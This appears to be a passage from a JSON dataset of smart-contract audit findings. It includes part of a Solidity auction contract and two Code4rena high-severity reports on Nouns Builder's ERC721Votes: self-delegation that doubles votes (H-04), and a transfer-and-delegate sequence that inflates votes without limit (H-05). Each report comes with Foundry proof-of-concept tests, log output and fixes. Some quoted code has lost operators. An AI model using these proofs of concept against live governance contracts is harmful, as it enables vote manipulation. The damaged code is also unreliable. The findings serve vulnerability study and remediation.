of each auction\n    function reservePrice() external view returns (uint256) {\n        return settings.reservePrice;\n    }\n\n    /// @notice The minimum amount of time to place a bid during an active auction\n    function timeBuffer() external view returns (uint256) {\n        return settings.timeBuffer;\n    }\n\n    /// @notice The minimum percentage an incoming bid must raise the highest bid\n    function minBidIncrement() external view returns (uint256) {\n        return settings.minBidIncrement;\n    }\n\n    ///                                                          ///\n    ///                       UPDATE SETTINGS                    ///\n    ///                                                          ///\n\n    /// @notice Updates the time duration of each auction\n    /// @param _duration The new time duration\n    function setDuration(uint256 _duration) external onlyOwner {\n        settings.duration = SafeCast.toUint40(_duration);\n\n        emit DurationUpdated(_duration);\n    }\n\n    /// @notice Updates the reserve price of each auction\n    /// @param _reservePrice The new reserve price\n    function setReservePrice(uint256 _reservePrice) external onlyOwner {\n        settings.reservePrice = _reservePrice;\n\n        emit ReservePriceUpdated(_reservePrice);\n    }\n\n    /// @notice Updates the time buffer of each auction\n    /// @param _timeBuffer The new time buffer\n    function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {\n        settings.timeBuffer = SafeCast.toUint40(_timeBuffer);\n\n        emit TimeBufferUpdated(_timeBuffer);\n    }\n\n    /// @notice Updates the minimum bid increment of each subsequent bid\n    /// @param _percentage The new percentage\n    function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {\n        settings.minBidIncrement = SafeCast.toUint8(_percentage);\n\n        emit MinBidIncrementPercentageUpdated(_percentage);\n    }\n\n    ///                                                          ///\n    ///                        TRANSFER UTIL                     ///\n    ///                                                          ///\n\n    /// @notice Transfer ETH/WETH from the contract\n    /// @param _to The recipient address\n    /// @param _amount The amount transferring\n    function _handleOutgoingTransfer(address _to, uint256 _amount) private {\n        // Ensure the contract has enough ETH to transfer\n        if (address(this).balance < _amount) revert INSOLVENT();\n\n        // Used to store if the transfer succeeded\n        bool success;\n\n        assembly {\n            // Transfer ETH to the recipient\n            // Limit the call to 50,000 gas\n            success := call(50000, _to, _amount, 0, 0, 0, 0)\n        }\n\n        // If the transfer failed:\n        if (!success) {\n            // Wrap as WETH\n            IWETH(WETH).deposit{ value: _amount }();\n\n            // Transfer WETH instead\n            IWETH(WETH).transfer(_to, _amount);\n        }\n    }\n\n    ///                                                          ///\n    ///                        AUCTION UPGRADE                   ///\n    ///                                                          ///\n\n    /// @notice Ensures the caller is authorized to upgrade the contract and the new implementation is valid\n    /// @dev This function is called in `upgradeTo` & `upgradeToAndCall`\n    /// @param _newImpl The new implementation address\n    function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {\n        // Ensure the new implementation is registered by the Builder DAO\n        if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl);\n    }\n}\n\n\n",
        "CodeNames": [
            "IERC721Votes.sol",
            "ERC721Votes.sol",
            "IERC721.sol",
            "ERC721.sol",
            "Auction.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "//solidity\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n",
                    "//solidity\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n",
                    "//solidity\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n",
                    "//solidity\n /// @dev Transfers voting weight\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _amount The number of votes delegating\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount  0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n            }\n        }\n    }\n",
                    "//solidity\n            // If voting weight is being transferred:\n            if (_from != _to && _amount  0) {\n",
                    "//solidity\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes _amount);\n                }\n",
                    "//solidity\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n"
                ],
                "Type": "  ERC721Votes : Token owners can double voting power through self delegation",
                "Description": "*Submitted by zkhorse, also found by berndartmueller, Ch_301, hxzy, hyh, MEP, pcarranzav, pfapostol, Picodes, and Solimander*\n\nThe owner of one or many ERC721Votes tokens can double their voting power once (and only once) by delegating to their own address as their first delegation.\n\n\nThis exploit relies on the initial default value of the delegation mapping in ERC721Votes, which is why it will only work once per address.\n\nFirst, the token owner must call delegate or delegateBySig, passing their own address as the delegate:\n\nERC721Votes#delegate(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135)\n\nsolidity\n    /// @notice Delegates votes to an account\n    /// @param _to The address delegating votes to\n    function delegate(address _to) external {\n        _delegate(msg.sender, _to);\n    }\n\n\nThis calls into the internal _delegate function, with _from and _to both set to the token owner's address:\n\nERC721Votes#_delegate(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190)\n\nsolidity\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n\n\nSince this is the token owner's first delegation, the delegation mapping does not contain a value for the _from address, and prevDelegate on L#181 will be set to address(0):\n\nERC721Votes.sol#L180-L181(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L180-L181)\n\nsolidity\n        // Get the previous delegate\n        address prevDelegate = delegation[_from];\n\n\nThis function then calls into _moveDelegateVotes to transfer voting power. This time, _from is prevDelegate, equal to address(0); _to is the token owner's address; and _amount is balanceOf(_from), the token owner's current balance:\n\nERC721Votes#_moveDelegateVotes(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235)\n\nsolidity\n /// @dev Transfers voting weight\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    /// @param _amount The number of votes delegating\n    function _moveDelegateVotes(\n        address _from,\n        address _to,\n        uint256 _amount\n    ) internal {\n        unchecked {\n            // If voting weight is being transferred:\n            if (_from != _to && _amount  0) {\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes _amount);\n                }\n\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n            }\n        }\n    }\n\n\nThe if condition on L#203 is true, since _from is address(0), _to is the owner address, and _amount is nonzero:\n\nERC721Votes.sol#L202-L203(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L202-L203)\n\nsolidity\n            // If voting weight is being transferred:\n            if (_from != _to && _amount  0) {\n\n\nExecution skips the if block on L#205-217, since _from is address(0):\n\nERC721Votes.sol#L205-L217(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L204-L217)\n\nsolidity\n                // If this isn't a token mint:\n                if (_from != address(0)) {\n                    // Get the sender's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_from]++;\n\n                    // Used to store the sender's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the sender's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes _amount);\n                }\n\n\nHowever, the if block on L#220-232 will execute and increase the voting power allocated to _to:\n\nERC721Votes.sol#L220-L232(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L219-L232)\n\nsolidity\n                // If this isn't a token burn:\n                if (_to != address(0)) {\n                    // Get the recipients's number of checkpoints\n                    uint256 nCheckpoints = numCheckpoints[_to]++;\n\n                    // Used to store the recipient's previous voting weight\n                    uint256 prevTotalVotes;\n\n                    // If this isn't the recipient's first checkpoint: Get their previous voting weight\n                    if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints 1].votes;\n\n                    // Update their voting weight\n                    _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);\n                }\n\n\nThe token owner's voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.\n\nThis exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation, prevDelegate will be set to a non-default value in _delegate, and the delegation logic will work as intended.\n\n\nMalicious ERC21Votes owners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.\n\n",
                "Repair": "\nMake the delegates function public rather than external:\n\nsolidity\n    /// @notice The delegate for an account\n    /// @param _account The account address\n    function delegates(address _account) public view returns (address) {\n        address current = delegation[_account];\n        return current == address(0) ? _account : current;\n    }\n\n\nThen, call this function rather than accessing the delegation mapping directly:\n\nsolidity\n    /// @dev Updates delegate addresses\n    /// @param _from The address delegating votes from\n    /// @param _to The address delegating votes to\n    function _delegate(address _from, address _to) internal {\n        // Get the previous delegate\n        address prevDelegate = delegates(_from);\n\n        // Store the new delegate\n        delegation[_from] = _to;\n\n        emit DelegateChanged(_from, prevDelegate, _to);\n\n        // Transfer voting weight from the previous delegate to the new delegate\n        _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));\n    }\n\n\nNote that the original NounsDAO contracts follow this pattern. (See here(https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91) and here(https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91)).\n\n### Test cases\n\n(Put the following test cases in Gov.t.sol)\n\nsolidity\n    function test_delegate_to_self_doubles_voting_power() public {\n        mintVoter1();\n\n        assertEq(token.getVotes(address(voter1)), 1);\n\n        vm.startPrank(voter1);\n        token.delegate(address(voter1));\n\n        assertEq(token.getVotes(address(voter1)), 2);\n    }\n\n    function mintToken(uint256 tokenId) internal {\n        vm.prank(voter1);\n        auction.createBid{ value: 0.420 ether }(tokenId);\n\n        vm.warp(block.timestamp + auctionParams.duration + 1 seconds);\n        auction.settleCurrentAndCreateNewAuction();\n    }\n\n    function test_delegate_to_self_multiple_tokens_doubles_voting_power() public {\n        // An especially malicious user may acquire multiple tokens\n        // before doubling their voting power through this exploit.\n        mintVoter1();\n        mintToken(3);\n        mintToken(4);\n        mintToken(5);\n        mintToken(6);\n\n        assertEq(token.getVotes(address(voter1)), 5);\n\n        vm.prank(voter1);\n        token.delegate(address(voter1));\n\n        assertEq(token.getVotes(address(voter1)), 10);\n    }\n\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413#issuecomment-1258152894):\n  The warden has shown how, because of an incorrect assumption in reducing a non-existing previous delegate votes, through self-delegation, a user can double their voting power.\n \n Because the finding shows how the delegation system is broken, and because governance is a core aspect (Secure funds, move funds, etc..) I agree with High Severity.\n \n Due to multiple reports of this type, with various different attacks, mitigation is non-trivial.\n\nkulkarohan (Nouns Builder) confirmed(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413#issuecomment-1261348244):\n  In contrast to the dangerous overflow, this finding (and its duplicates) has shown how the Delegation Mechanism can be used to double the voting power.\n \n For that reason, the underlying issue being different, am choosing to leave this finding separate.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "",
        "CodeNames": [
            ""
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-05",
                "Location": [
                    "//solidity\n// Insert this test case into Token.t.sol\n// Run: forge test --match-contract Token -vv\n\nimport \"forge-std/console.sol\";\n...\nfunction testIncreaseVotePower() public {\n        deployMock();\n\n        address voter1;\n        address voter2;\n        uint256 voter1PK;\n        uint256 voter2PK;\n\n        // Voter with 1 NFT voting power\n        voter1PK = 0xABC;\n        voter1 = vm.addr(voter1PK);\n        vm.deal(voter1, 1 ether);\n        // Second account created by same voter\n        voter2PK = 0xABD;\n        voter2 = vm.addr(voter2PK);\n\n\t\t// Giving voter1 their 1 NFT\n        vm.prank(founder);\n        auction.unpause();\n        vm.prank(voter1);\n        auction.createBid{ value: 0.420 ether }(2);\n        vm.warp(auctionParams.duration + 1 seconds);\n        auction.settleCurrentAndCreateNewAuction();\n\n        // Start Exploit\n        console.log(\"Initial Votes\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n        \n        vm.prank(voter1);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter1 - delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n\n        vm.prank(voter1);\n        token.transferFrom(voter1, voter2, 2); \n        console.log(\"After Token transfer, voter1 -transferFrom()- voter2\");\n        console.log(\"voter1 votes: \", token.getVotes(voter1));\n        console.log(\"voter2 votes: \", token.getVotes(voter2));\n\n        vm.prank(voter2);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter2 - delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n    }\n",
                    "//solidity\n[PASS] testVoteDoublePower() (gas: 3544946)\nLogs:\n  Initial Votes\n  voter1:  1\n  voter2:  0\n  After Delegating Votes, voter1 - delegate(voter2)   \n  voter1:  1\n  voter2:  1\n  After Token transfer, voter1 -transferFrom()- voter2\n  voter1 votes:  0\n  voter2 votes:  2\n  After Delegating Votes, voter2 - delegate(voter2)   \n  voter1:  0\n  voter2:  3\n"
                ],
                "Type": "  _transferFrom()  can be used to indefinitely increase voting power",
                "Description": "*Submitted by Soosh, also found by Ch_301, davidbrai, and PwnPatrol*\n\nIt is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.\n\n\nThe _transferFrom()  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)\n\n\nsolidity\n// Insert this test case into Token.t.sol\n// Run: forge test --match-contract Token -vv\n\nimport \"forge-std/console.sol\";\n...\nfunction testIncreaseVotePower() public {\n        deployMock();\n\n        address voter1;\n        address voter2;\n        uint256 voter1PK;\n        uint256 voter2PK;\n\n        // Voter with 1 NFT voting power\n        voter1PK = 0xABC;\n        voter1 = vm.addr(voter1PK);\n        vm.deal(voter1, 1 ether);\n        // Second account created by same voter\n        voter2PK = 0xABD;\n        voter2 = vm.addr(voter2PK);\n\n\t\t// Giving voter1 their 1 NFT\n        vm.prank(founder);\n        auction.unpause();\n        vm.prank(voter1);\n        auction.createBid{ value: 0.420 ether }(2);\n        vm.warp(auctionParams.duration + 1 seconds);\n        auction.settleCurrentAndCreateNewAuction();\n\n        // Start Exploit\n        console.log(\"Initial Votes\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n        \n        vm.prank(voter1);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter1 - delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n\n        vm.prank(voter1);\n        token.transferFrom(voter1, voter2, 2); \n        console.log(\"After Token transfer, voter1 -transferFrom()- voter2\");\n        console.log(\"voter1 votes: \", token.getVotes(voter1));\n        console.log(\"voter2 votes: \", token.getVotes(voter2));\n\n        vm.prank(voter2);\n        token.delegate(voter2);\n        console.log(\"After Delegating Votes, voter2 - delegate(voter2)\");\n        console.log(\"voter1: \", token.getVotes(voter1));\n        console.log(\"voter2: \", token.getVotes(voter2));\n    }\n\n\nExpected Output:\n\nsolidity\nPASS] testVoteDoublePower() (gas: 3544946)\nLogs:\n  Initial Votes\n  voter1:  1\n  voter2:  0\n  After Delegating Votes, voter1 - delegate(voter2)   \n  voter1:  1\n  voter2:  1\n  After Token transfer, voter1 -transferFrom()- voter2\n  voter1 votes:  0\n  voter2 votes:  2\n  After Delegating Votes, voter2 - delegate(voter2)   \n  voter1:  0\n  voter2:  3\n\n\n",
                "Repair": "\nLooking at OpenZeppelin's ERC721Votes(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states:\n\n    * Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost\n    * on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of\n    * the votes in governance decisions, or they can delegate to themselves to be their own representative.\n\nThe current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated.\n\n*   I believe the issue is here on this line(https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268)\n\nsolidity\n// Transfer 1 vote from the sender to the recipient\n        _moveDelegateVotes(_from, _to, 1);\n\n\nWhere it should move from the delegate of _from to the delegate of _to. Suggested FIx:\n\nsolidity\n _moveDelegateVotes(delegation[_from], delegation[_to], 1);\n\n\niainnash (Nouns Builder) confirmed and commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1258530566):\n  Would agree w/ High risk.\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1258739921):\n  The Warden has shown how, due to an incorrect handling of delegation, a Token Holder can delegate their voting power without losing it, allowing for an exploit that allows them to reach infinite voting power.\n \n I believe that some of the problems with Delegation shown via this contest can be traced down to this quote from the OZ Documentation(https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721Votes)\n \n Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of the votes in governance decisions, or they can delegate to themselves to be their own representative.\n \n \n Remediation of this specific issue can be done by following the warden advice, and using the Test Case to verify the exploit has been patched, additionally, further thinking into how delegation should behave will be necessary to ensure the system is patched to safety\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/224#issuecomment-1261353232):\n  In contrast to issue 469(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469) (Unsafe Underflow) and issue 413(https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413) (Self Delegation for doubling of votes), this report is showing how, due to an incorrect accounting, a user can repeatedly transfer and delegate to achieve infinite voting power.\n \n While the outcome of all 3 is increased voting power, I believe the uniqueness of the attack is in exploiting a different aspect of the code.\n \n Remediation should account for all 3 exploits, and I believe, because of the uniqueness of the attack, that this is a distinct report vs the previously mentioned.\n\n\n\n*\n \n\n"
            }
        ]
    }
]